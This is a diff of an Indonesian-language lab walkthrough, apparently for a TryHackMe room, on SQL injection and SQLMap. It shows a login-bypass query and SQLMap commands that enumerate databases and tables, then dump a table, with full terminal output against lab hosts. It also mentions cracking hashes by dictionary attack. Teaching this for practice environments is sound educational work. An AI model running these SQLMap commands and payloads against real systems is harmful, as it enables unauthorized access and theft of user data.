@@ -52,12 +52,12 @@ Mari kita bedah skenario dunia nyata. Bayangkan sebuah _form login_ sederhana ya
 Sebagian besar mekanisme _login_ kuno bekerja dengan mengambil _input_ pengguna dan menyisipkannya langsung ke dalam sebuah query SQL.
 
 **Skenario Normal (Penggunaan Valid):**
-Jika pengguna reguler memasukkan data otentikasi:
+Jika pengguna reguler memasukkan data autentikasi:
 
 - **Username:** `John`
 - **Password:** `Un@detectable444`
 
-Sistem (Aplikasi Web) akan menelan _input_ tersebut dan merakitnya menjadi sebuah kueri SQL yang akan dilempar ke sang Koki (_Database_):
+Sistem (Aplikasi Web) akan menerima _input_ tersebut dan merakitnya menjadi sebuah kueri SQL yang akan dilempar ke sang Koki (_Database_):
 
 ```sql
 SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
@@ -102,24 +102,24 @@ Hasil akhirnya? Pemilik aslinya menangis, dan kita (Red Team) masuk (Login) seba
 
 ## Task 3 Automated SQL Injection
 
-Eksploitasi SQL Injection secara manual (terutama jenis _blind_) memang sangat penting untuk memahami fondasinya. Tapi di lapangan, ngekstrak _database_ segede gaban secara manual bakal ngabisin banyak tenaga dan waktu banget, Bro. Di situlah kita main pakai **SQLMap**.
+Eksploitasi SQL Injection secara manual (terutama jenis _blind_) memang sangat penting untuk memahami fondasinya. Tapi di lapangan, mengekstrak _database_ yang berukuran enterprise secara manual bakal ngabisin banyak tenaga dan waktu. Di situlah kita main pakai **SQLMap**.
 
 ### Apa itu SQLMap?
 
-Ibaratnya, SQLMap itu _sniper rifle_ otomatis buat urusan SQL Injection. Ini adalah _tool command-line open-source_ sakti yang dirancang khusus untuk mengotomatisasi proses pendeteksian dan eksploitasi kerentanan SQLi. Tool ini bahkan udah bawaan (_built-in_) di beberapa OS Linux _pentesting_.
+SQLMap adalah _tool command-line open-source_ yang dirancang khusus untuk mengotomatisasi proses pendeteksian dan eksploitasi kerentanan SQLi. Tool ini bahkan udah bawaan (_built-in_) di beberapa OS Linux _pentesting_.
 
 ### Menggunakan SQLMap
 
-Karena ini murni _command-line tool_, kamu harus buka terminal OS Linux kamu. Kamu bisa pakai _flag_ `--help` buat ngeliat deretan fungsi dan parameter buas yang bisa kamu setel. Tapi, buat pemula atau kalau kamu pengen panduan anti-ribet, ada _flag_ andalan:
+Karena ini murni _command-line tool_, kamu harus buka terminal OS Linux kamu. Kamu bisa pakai _flag_ `--help` buat ngeliat deretan fungsi dan parameter yang bisa kamu sesuaikan. Tapi, buat pemula atau kalau kamu pengen panduan anti-ribet, ada _flag_ andalan:
 
 **The Wizard Mode (`--wizard`)**
-Mode ini super asyik karena _tool_ bakal memandu kamu secara interaktif, nanya langkah demi langkah buat nyelesaiin konfigurasi serangannya, cocok banget buat _beginners_.
+Mode ini bakal memandu kamu secara interaktif, nanya langkah demi langkah buat nyelesaiin konfigurasi serangannya, cocok banget buat _beginners_.
 
 ```bash
 sqlmap --wizard
 ```
 
-_Output_ di terminal kamu (seperti gambar) kurang lebih bakal nampilin _banner_ SQLmap, ngejalanin _wizard interface_, dan pertama kali bakal minta URL target lo:
+_Output_ di terminal kamu (seperti gambar) kurang lebih bakal nampilin _banner_ SQLmap, ngejalanin _wizard interface_, dan pertama kali bakal minta URL target:
 
 ```text
 user@ubuntu:~$ sqlmap --wizard
@@ -161,14 +161,27 @@ Secara umum, _hunting_ kerentanan ini dimulai dengan mencari celah URL yang namp
    sqlmap -u "http://target.com/admin/search?id=1" --cookie="SESSIONID=abcdef123456"
    ```
 
+3. **POST-Based Testing (Intercepted Requests):**
+   Gimana kalau _input_ datanya tersembunyi, contohnya di _form login_ atau register yang pakai metode `POST`? URL-nya bakal keliatan bersih (misal cuma `http://target.com/login`), karena datanya dikirim lewat _request body_.
+
+   **Solusi:** Menjadi _Hacker_ sejati berarti kamu harus _intercept_ (tangkap) _request raw_ tersebut (biasanya pakai alat _Proxy_ kayak Burp Suite), lalu _save_ hasil _request_ mentahnya ke dalam file `.txt`. Setelah itu, serahkan file tersebut ke SQLMap menggunakan _flag_ `-r` (Request file).
+
+   ```bash
+   user@arch:~$ sqlmap -r intercepted_request.txt
+   ```
+
+   _Catatan Tambahan: SQLMap akan otomatis mendeteksi semua parameter `POST` di dalam file text tersebut dan menyuntikkan payloadnya satu per satu._
+
+   > **Note:** _Mempelajari cara bagaimana meng-**intercept** dan menangkap traffic POST berada di luar jangkauan (out-of-scope) materi dasar di room ini._
+
 ---
 
 ### Membedah Output SQLMap (Terminal Autopsy)
 
 Ketika SQLMap ditembakkan ke _Injection Point_ dan celahnya terkonfirmasi (Vulnerable), terminal bakal ngeluarin banyak info krusial.
 
-```zsh
-user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1
+```text
+user@arch:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1
     ___
    __H__
  ___ __[']_____ ___ ___  {1.2.4#stable}
@@ -214,28 +227,28 @@ back-end DBMS: MySQL >= 5.1
 [text removed]
 ```
 
-Perhatikan baris-baris krusial dari output di atas:
+Perhatikan baris-baris penting dari output di atas:
 
 1. **WAF/IPS/IDS Check (`checking if the target is protected...`)**
-   SQLMap secara otomatis bakal nyari tau dulu apakah ada Firewall/IPS yang jagain website itu sebelum ia masuk dan _bruteforce_ _payloads_.
+   SQLMap secara otomatis bakal nyari tau dulu apakah ada Firewall/IPS yang menjaga website itu sebelum ia masuk dan _bruteforce_ _payloads_.
 2. **Injection Point Confirmation (`GET parameter 'cat' is vulnerable...`)**
-   Kalau dapet pesan ini, Celah (Injection Point) berhasil dikonfirmasi bisa diinjeksi.
+   Kalau dapet pesan ini, Celah (Injection Point) berhasil dikonfirmasi yang artinya bisa diinjeksi.
 3. **Payload Autopsy (Tipe Serangan yang Berhasil)**
    SQLMap membongkar _exact payload_ apa yang sukses merobohkan _backend_. Misalnya di atas: _boolean-based_, _error-based_, dan _UNION_. Di dunia _pentest_, _payload_ ini akan kamu salin untuk dimasukkan ke laporan buktinya (Proof of Concept).
 4. **Fingerprinting**
-   Di bagian bawah output, identitas target berhasil dibongkar: `DBMS: MySQL >= 5.1`, OS _Server_: `Linux Ubuntu`, dan Web Server-nya `Nginx`. _(Mendapatkan OS ini sangat penting buat Red Teamer jika skenarionya eskalasi untuk mengambil alih mesin tersebut atau RCE)._
+   Di bagian bawah output, identitas target berhasil dibongkar: `DBMS: MySQL >= 5.1`, OS _Server_: `Linux Ubuntu`, dan Web Server-nya `Nginx`. _(Mendapatkan OS ini sangat penting buat Red Teamer jika skenarionya privilege escalation untuk mengambil alih mesin tersebut atau RCE)._
 
 ---
 
 ### Data Extraction (Ekskavasi Data)
 
-Setelah celah URL _vulnerable_ (_Injection Point_) dikonfirmasi dan _fingerprinting_ berhasil, SQLMap akan digunakan secara bertahap untuk panen data dari _database_ tersebut. Gunakan hirarki _flag_ ini:
+Setelah celah URL _vulnerable_ (_Injection Point_) dikonfirmasi dan _fingerprinting_ berhasil, SQLMap akan digunakan secara bertahap untuk panen data dari _database_ tersebut. Gunakan _flag_ ini:
 
 **1. Mencari Nama Database (`--dbs`)**
 Langkah awal adalah mencari tumpukan lumbung hartanya, apa nama _databases_ yang bisa kita akses. Eksekusi Flag `--dbs`:
 
-```bash
-user@ubuntu:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
+```text
+user@arch:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 --dbs
     ___
    __H__
  ___ __[']_____ ___ ___  {1.2.4#stable}
@@ -255,10 +268,91 @@ available databases [2]:
 _Dari gambar terminal di atas, SQLMap sukses mengambil nama database yaitu `users` dan `members`._
 
 **2. Melihat Isi Tabel (`-D <nama_database> --tables`)**
-Setelah tahu sasarannya (misal database `members`), kamu bongkar buat melihat ada tabel apa aja di dalamnya.
+Setelah tahu sasarannya (misal database `users`), kamu bongkar buat melihat ada tabel apa aja di dalamnya. Tentukan databasenya spesifik dengan `-D users` lalu akhiri dengan `--tables`.
 
-**3. The Holy Grail Dump (`-D <nama_database> -T <nama_tabel> --dump`)**
-Digunakan untuk memuntahkan (dumping) seluruh isi _records_ atau data sensitif di dalam _table_ tersebut.
+```bash
+user@arch:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
+    ___
+   __H__
+ ___ __[']_____ ___ ___  {1.2.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[text removed]
+[08:50:46] [INFO] resuming back-end DBMS' mysql'
+[08:50:46] [INFO] testing connection to the target URL
+[08:50:46] [INFO] heuristics detected web page charset 'ascii'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 2175=2175
+[text removed]
+[08:50:46] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx, PHP 5.6.40
+back-end DBMS: MySQL >= 5.1
+[08:50:46] [INFO] fetching tables for database: 'users'
+Database: acuart
+[3 tables]
++----------+
+| johnath  |
+| alexas   |
+| thomas   |
++----------+
+
+[text removed]
+```
+
+_Berdasarkan target database `users`, kita sukses membongkar dan menemukan tiga buah tabel (`johnath`, `alexas`, `thomas`)!_
+
+**3. Dump database (`-D <nama_database> -T <nama_tabel> --dump`)**
+Digunakan untuk memunculkan (dumping) seluruh isi _records_ atau data sensitif di dalam _table_ tersebut. Setelah mendapati ada tabel menarik seperti `thomas`, saatnya melancarkan jurus terakhir buat narik semua isinya: `--dump`.
+
+```bash
+user@arch:~$ sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users -T thomas --dump
+    ___
+   __H__
+ ___ __[']_____ ___ ___  {1.2.4#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[text removed]
+[08:51:48] [INFO] resuming back-end DBMS' mysql'
+[08:51:48] [INFO] testing connection to the target URL
+[08:51:49] [INFO] heuristics detected web page charset 'ascii'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=1 AND 2175=2175
+[text removed]
+[08:51:49] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx, PHP 5.6.40
+back-end DBMS: MySQL >= 5.1
+[08:51:49] [INFO] fetching columns for table 'thomas' in database 'users'
+[08:51:49] [INFO] fetching entries for table 'thomas' in database 'users'
+[08:51:49] [INFO] recognized possible password hashes in column 'passhash'
+do you want to store hashes to a temporary file for eventual further processing n
+do you want to crack them via a dictionary-based attack? [Y/n/q] n
+Database: users
+Table: thomas
+[1 entry]
++------------+------------+---------+
+| Date       | name       | pass    |
++------------+------------+---------+
+| 09/09/2024 | Thomas THM | testing |
++------------+------------+---------+
+
+[text removed]
+```
+
+_Username dan Password si `thomas` berhasil di-dump (Pojok Bawah!). Kelihatan jelas ada field `Date`, `name`, dan `pass`. Kalau parameter hash-nya sulit kayak MD5/Bcrypt, SQLMap bahkan nawarin opsi otomatis buat nge-crack hash tersebut pakai dictionary attack secara instan._
 
 ---
 
